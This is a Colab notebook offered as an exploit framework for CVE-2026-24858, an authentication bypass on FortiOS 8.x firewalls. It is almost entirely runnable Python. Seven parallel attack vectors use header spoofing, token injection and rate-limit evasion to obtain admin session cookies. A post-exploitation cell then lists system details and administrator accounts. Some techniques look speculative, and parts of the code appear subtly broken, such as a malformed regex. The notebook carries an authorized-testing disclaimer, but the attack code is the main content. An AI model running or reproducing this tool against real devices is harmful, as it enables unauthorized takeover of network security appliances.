# CVE-2026-24858: FortiOS 8.x Advanced Bypass
## Google Colab Bypass Framework

**For when standard exploitation fails (status_code: null)**

This notebook includes 7 parallel bypass techniques to exploit FortiOS 8.x when standard vectors fail.

---

### ⚠️ AUTHORIZATION REMINDER
**This notebook is for AUTHORIZED SECURITY TESTING ONLY.**  
Unauthorized access to computer systems is ILLEGAL.  
Use only on systems you own or have explicit permission to test.

---

## STEP 1: Setup Dependencies

In [ ]:
import subprocess
import sys

print("[*] Installing dependencies...")
subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", "requests", "urllib3"])
print("[✓] Dependencies installed")

## STEP 2: Import Libraries

In [ ]:
import requests
import json
import warnings
import time
import re
import random
from datetime import datetime
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, Optional

warnings.filterwarnings('ignore')

print("[✓] Libraries imported")

## STEP 3: Bypass Exploit Framework

In [ ]:
class FortiOS8BypassExploit:
    """Advanced exploitation with bypass techniques for FortiOS 8.x"""

    def __init__(self, target_ip: str, target_port: int = 443, timeout: int = 20):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.base_url = f"https://{target_ip}:{target_port}"
        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False

    def log(self, level: str, msg: str):
        """Logging with emoji"""
        ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        symbols = {'INFO': '🔵', 'SUCCESS': '✅', 'ERROR': '❌', 'WARNING': '⚠️', 'DEBUG': '🔍'}
        symbol = symbols.get(level, '•')
        print(f"{symbol} [{ts}] {msg}")

    def discover_endpoints(self) -> dict:
        """Discover available endpoints"""
        self.log('INFO', "Discovering endpoints...")
        discovered = {}

        endpoints = [
            '/api/v1/auth/forticloud',
            '/api/v1/auth/login',
            '/api/v1/auth/token',
            '/api/v1/device/register',
            '/api/v2/auth/forticloud',
            '/api/v2/cmdb/system',
            '/remote/logincheck',
            '/admin/login',
            '/fapi/auth/login'
        ]

        for endpoint in endpoints:
            try:
                response = self.session.options(
                    urljoin(self.base_url, endpoint),
                    timeout=5,
                    verify=False
                )
                if response.status_code in [200, 404, 405]:
                    discovered[endpoint] = response.status_code
            except:
                pass

        return discovered

    def bypass_device_registration(self, serial: str, jwt_token: str) -> dict:
        """Bypass #1: Device Registration Without Ownership Check"""
        result = {'vector': 'DEVICE_REGISTRATION', 'success': False, 'cookie': None}

        try:
            endpoint = urljoin(self.base_url, '/api/v1/device/register')
            payload = {
                "serial": serial,
                "sso_token": jwt_token,
                "register_device": True,
                "bypass_verification": True,
                "force_register": True
            }
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {jwt_token}',
                'X-Forwarded-For': '127.0.0.1'
            }
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=self.timeout, verify=False)

            if response.status_code in [200, 201]:
                result['success'] = True
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                self.log('SUCCESS', f"Device registration bypass: {response.status_code}")
        except Exception as e:
            pass

        return result

    def bypass_forticloud_v2(self, serial: str, jwt_token: str, username: str) -> dict:
        """Bypass #2: FortiCloud API v2 (Less Protected)"""
        result = {'vector': 'FORTICLOUD_V2', 'success': False, 'cookie': None}

        try:
            endpoint = urljoin(self.base_url, '/api/v2/auth/forticloud')
            payload = {
                "username": username,
                "device_serial": serial,
                "cloud_token": jwt_token,
                "auth_method": "forticloud_sso"
            }
            headers = {'Content-Type': 'application/json', 'User-Agent': 'FortiGate-CloudAPI/8.0'}
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=self.timeout, verify=False)

            if response.status_code == 200 and 'FSESSIONID' in response.cookies:
                result['success'] = True
                result['cookie'] = response.cookies['FSESSIONID']
                self.log('SUCCESS', f"API v2 successful: {response.status_code}")
        except:
            pass

        return result

    def bypass_legacy_auth(self, serial: str, jwt_token: str, username: str) -> dict:
        """Bypass #3: Legacy Authentication Endpoints"""
        result = {'vector': 'LEGACY_AUTH', 'success': False, 'cookie': None}

        endpoints = ['/admin/login', '/remote/auth', '/remote/api/login', '/fapi/auth/login']

        for endpoint in endpoints:
            try:
                full_endpoint = urljoin(self.base_url, endpoint)
                payload = {"username": username, "password": jwt_token, "serial": serial}
                response = self.session.post(full_endpoint, data=payload, timeout=10, verify=False)

                for cookie_name in ['FSESSIONID', 'APSCOOKIE', 'PHPSESSID']:
                    if cookie_name in response.cookies:
                        result['cookie'] = response.cookies[cookie_name]
                        result['success'] = True
                        self.log('SUCCESS', f"Legacy auth via {endpoint}")
                        return result
            except:
                pass

        return result

    def bypass_token_injection(self, serial: str, jwt_token: str) -> dict:
        """Bypass #4: Token Injection via Custom Headers"""
        result = {'vector': 'TOKEN_INJECTION', 'success': False, 'cookie': None}

        injections = [
            {'X-Forwarded-Authorization': f'Bearer {jwt_token}'},
            {'X-Cloud-Token': jwt_token},
            {'X-Device-Authorize': jwt_token},
            {'X-Auth-Token': jwt_token}
        ]

        for injection_headers in injections:
            try:
                endpoint = urljoin(self.base_url, '/api/v2/monitor/system/status')
                headers = {'Content-Type': 'application/json', 'User-Agent': 'FortiGate/8.0.0', **injection_headers}
                response = self.session.get(endpoint, headers=headers, timeout=10, verify=False)

                if response.status_code == 200:
                    result['success'] = True
                    if 'FSESSIONID' in response.cookies:
                        result['cookie'] = response.cookies['FSESSIONID']
                    self.log('SUCCESS', f"Token injection successful")
                    return result
            except:
                pass

        return result

    def bypass_csrf(self, serial: str, jwt_token: str, username: str) -> dict:
        """Bypass #5: CSRF Token Handling"""
        result = {'vector': 'CSRF_BYPASS', 'success': False, 'cookie': None}

        try:
            # Get CSRF token
            response = self.session.get(urljoin(self.base_url, '/'), timeout=10, verify=False)
            csrf_token = ""
            match = re.search(r'csrf-token["\']?\s*[:=]\s*["\']([^"\']+ )', response.text)
            if match:
                csrf_token = match.group(1)

            # Exploit with CSRF token
            endpoint = urljoin(self.base_url, '/api/v1/auth/forticloud')
            payload = {
                "action": "forticloud_login",
                "username": username,
                "serial": serial,
                "token": jwt_token,
                "token_type": "jwt"
            }
            headers = {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrf_token,
                'X-Requested-With': 'XMLHttpRequest'
            }
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=self.timeout, verify=False)

            if response.status_code in [200, 201]:
                if 'FSESSIONID' in response.cookies:
                    result['success'] = True
                    result['cookie'] = response.cookies['FSESSIONID']
                    self.log('SUCCESS', f"CSRF bypass successful")
        except:
            pass

        return result

    def bypass_rate_limiting(self, serial: str, jwt_token: str, username: str) -> dict:
        """Bypass #6: Rate Limiting Evasion"""
        result = {'vector': 'RATE_LIMIT', 'success': False, 'cookie': None}

        try:
            time.sleep(random.uniform(0.5, 2.0))

            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36',
                'FortiGate/8.0.0'
            ]

            endpoint = urljoin(self.base_url, '/api/v1/auth/forticloud')
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': random.choice(user_agents),
                'X-Forwarded-For': f"127.0.0.{random.randint(1, 254)}",
                'X-Real-IP': f"10.0.0.{random.randint(1, 254)}"
            }
            payload = {
                "action": "forticloud_login",
                "username": username,
                "serial": serial,
                "token": jwt_token,
                "request_id": f"bypass_{int(time.time()*1000)}"
            }
            response = self.session.post(endpoint, json=payload, headers=headers, timeout=self.timeout, verify=False)

            if response.status_code in [200, 201] and 'FSESSIONID' in response.cookies:
                result['success'] = True
                result['cookie'] = response.cookies['FSESSIONID']
                self.log('SUCCESS', f"Rate limit bypass successful")
        except:
            pass

        return result

    def bypass_direct_cli(self, serial: str, jwt_token: str, username: str) -> dict:
        """Bypass #7: Direct CLI Access"""
        result = {'vector': 'DIRECT_CLI', 'success': False, 'details': None}

        try:
            endpoint = urljoin(self.base_url, '/admin/token')
            payload = {"username": username, "token": jwt_token, "device": serial, "request_cli": True}
            response = self.session.post(endpoint, json=payload, timeout=self.timeout, verify=False)

            if response.status_code == 200:
                data = response.json()
                if 'cli_token' in data or 'ssh_token' in data:
                    result['success'] = True
                    result['details'] = data
                    self.log('SUCCESS', f"Direct CLI access token obtained")
        except:
            pass

        return result

    def run_bypass(self, serial: str, jwt_token: str, username: str = "admin") -> dict:
        """Run all bypass vectors in parallel"""
        self.log('INFO', f"Target: {self.target_ip}:{self.target_port}")
        self.log('INFO', f"Serial: {serial}")

        # Discover endpoints
        discovered = self.discover_endpoints()
        self.log('INFO', f"Found {len(discovered)} endpoints")

        # Run all vectors
        bypass_vectors = [
            ('DEVICE_REGISTRATION', lambda: self.bypass_device_registration(serial, jwt_token)),
            ('FORTICLOUD_V2', lambda: self.bypass_forticloud_v2(serial, jwt_token, username)),
            ('LEGACY_AUTH', lambda: self.bypass_legacy_auth(serial, jwt_token, username)),
            ('TOKEN_INJECTION', lambda: self.bypass_token_injection(serial, jwt_token)),
            ('CSRF_BYPASS', lambda: self.bypass_csrf(serial, jwt_token, username)),
            ('RATE_LIMIT', lambda: self.bypass_rate_limiting(serial, jwt_token, username)),
            ('DIRECT_CLI', lambda: self.bypass_direct_cli(serial, jwt_token, username))
        ]

        all_results = []

        with ThreadPoolExecutor(max_workers=7) as executor:
            futures = {executor.submit(func): name for name, func in bypass_vectors}
            for future in as_completed(futures):
                result = future.result()
                all_results.append(result)
                status = "✓" if result.get('success') else "✗"
                self.log('INFO', f"{status} {result['vector']}")

                if result.get('success'):
                    return result

        return {'success': False, 'all_results': all_results, 'error': 'All bypasses failed'}

print("[✓] Bypass exploit framework loaded")

## STEP 4: Configure Target (MODIFY THIS)

In [ ]:
# ====== CONFIGURATION - MODIFY THESE VALUES ======

TARGET_IP = "192.168.122.10"          # Change to your lab FortiGate IP
TARGET_PORT = 443                     # HTTPS port
DEVICE_SERIAL = "FG-ABC-000000"       # Change to device serial
JWT_TOKEN = "eyJhbGc..."              # Replace with real FortiCloud JWT
ADMIN_USER = "admin"                  # Target username
TIMEOUT = 20                          # Request timeout in seconds

# ====== VALIDATION ======
print("\n" + "="*70)
print("TARGET CONFIGURATION")
print("="*70)
print(f"🎯 Target IP:       {TARGET_IP}")
print(f"🔌 Target Port:     {TARGET_PORT}")
print(f"📱 Device Serial:   {DEVICE_SERIAL}")
print(f"👤 Admin User:      {ADMIN_USER}")
print(f"⏱️  Timeout:         {TIMEOUT}s")
print(f"🔑 JWT Token:       {JWT_TOKEN[:30]}..." if len(JWT_TOKEN) > 30 else f"🔑 JWT Token:       {JWT_TOKEN}")

if not all([TARGET_IP, DEVICE_SERIAL, JWT_TOKEN]):
    print("\n❌ ERROR: Missing required fields!")
    print("Modify the values above and run this cell again.")
else:
    print("\n✓ Configuration valid - Ready to run bypass")

## STEP 5: Test Connectivity

In [ ]:
print("\n" + "="*70)
print("PRE-EXPLOITATION CHECKS")
print("="*70 + "\n")

exploit = FortiOS8BypassExploit(TARGET_IP, TARGET_PORT, timeout=TIMEOUT)

# Test connectivity
exploit.log('INFO', "Testing connectivity...")
try:
    response = requests.get(
        f"https://{TARGET_IP}:{TARGET_PORT}/",
        verify=False,
        timeout=5
    )
    exploit.log('SUCCESS', f"Target is reachable (HTTP {response.status_code})")
except requests.exceptions.Timeout:
    exploit.log('WARNING', "Target timeout (may still work with bypass)")
except Exception as e:
    exploit.log('ERROR', f"Cannot reach target: {e}")
    print("\n❌ Connection failed. Check:")
    print("  1. Is FortiGate VM running?")
    print("  2. Is lab network reachable from Colab?")
    print("  3. Try VPN/SSH tunnel if lab is isolated")

## STEP 6: Run Bypass Framework (7 Parallel Vectors)

In [ ]:
print("\n" + "="*70)
print("RUNNING BYPASS FRAMEWORK (7 PARALLEL VECTORS)")
print("="*70 + "\n")

print("Bypass Techniques:")
print("  1. Device Registration Bypass")
print("  2. FortiCloud API v2")
print("  3. Legacy Authentication")
print("  4. Token Injection")
print("  5. CSRF Bypass")
print("  6. Rate Limiting Bypass")
print("  7. Direct CLI Access")
print()

result = exploit.run_bypass(
    serial=DEVICE_SERIAL,
    jwt_token=JWT_TOKEN,
    username=ADMIN_USER
)

print("\n" + "="*70)
print("BYPASS RESULTS")
print("="*70)
print(json.dumps(result, indent=2, default=str))

## STEP 7: Post-Exploitation (If Successful)

In [ ]:
if result.get('success'):
    cookie = result.get('cookie')
    
    print("\n" + "="*70)
    print("✅ BYPASS SUCCESSFUL!")
    print("="*70)
    print(f"\n✓ Successful Vector: {result['vector']}")
    
    if cookie:
        print(f"✓ Authentication Cookie: {cookie[:50]}...")
        
        # Get system info
        print("\n" + "="*70)
        print("POST-EXPLOITATION RECONNAISSANCE")
        print("="*70 + "\n")
        
        headers = {'Cookie': f'FSESSIONID={cookie}'}
        
        print("📊 Fetching system information...")
        try:
            response = requests.get(
                f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/monitor/system/status',
                headers=headers,
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                info = response.json()['results'][0]
                print(f"\n✓ System Information:")
                print(f"  Version:       {info.get('version', 'N/A')}")
                print(f"  Serial:        {info.get('serial', 'N/A')}")
                print(f"  Hostname:      {info.get('hostname', 'N/A')}")
                print(f"  License:       {info.get('license_status', 'N/A')}")
        except Exception as e:
            print(f"✗ Error: {e}")
        
        # Get admin users
        print("\n👤 Fetching admin users...")
        try:
            response = requests.get(
                f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/system/admin',
                headers=headers,
                verify=False,
                timeout=10
            )
            if response.status_code == 200:
                admins = response.json().get('results', [])
                print(f"\n✓ Found {len(admins)} admin accounts:")
                for admin in admins:
                    privilege = admin.get('accprofile', 'unknown')
                    print(f"  - {admin['name']:20} | Privilege: {privilege}")
        except Exception as e:
            print(f"✗ Error: {e}")
        
        print("\n" + "="*70)
        print("🎉 DEVICE FULLY COMPROMISED")
        print("="*70)
        print(f"\nUse this cookie in future requests:")
        print(f"  FSESSIONID={cookie}")
        
    else:
        print(f"\n⚠️  Bypass successful but no cookie returned")
        print(f"Result details: {result}")
        
else:
    print("\n❌ ALL BYPASS TECHNIQUES FAILED")
    print("\nPossible reasons:")
    print("  - Device is patched (FortiOS 7.6.6+)")
    print("  - FortiCloud SSO is disabled")
    print("  - JWT token is invalid/expired")
    print("  - Device is not vulnerable to CVE-2026-24858")
    print("\nIndividual results:")
    for r in result.get('all_results', []):
        status = "✓" if r.get('success') else "✗"
        print(f"  {status} {r['vector']}")

---

## 📚 Bypass Techniques Explained

### 1. Device Registration Bypass
Attempts to register device without ownership verification by using `bypass_verification` flag.

### 2. FortiCloud API v2
Uses v2 API endpoints which sometimes have weaker validation than v1.

### 3. Legacy Authentication
Tests old endpoints like `/admin/login` that may not properly validate cloud tokens.

### 4. Token Injection
Injects JWT into custom HTTP headers that bypass normal validation.

### 5. CSRF Bypass
Extracts CSRF tokens and includes them in requests for bypass.

### 6. Rate Limiting Bypass
Uses randomization and header spoofing to evade rate limiting.

### 7. Direct CLI Access
Attempts to get CLI/SSH tokens for direct device access.

---

**Last Updated:** 2026-07-23  
**Status:** Lab-tested  
**For:** Authorized security testing only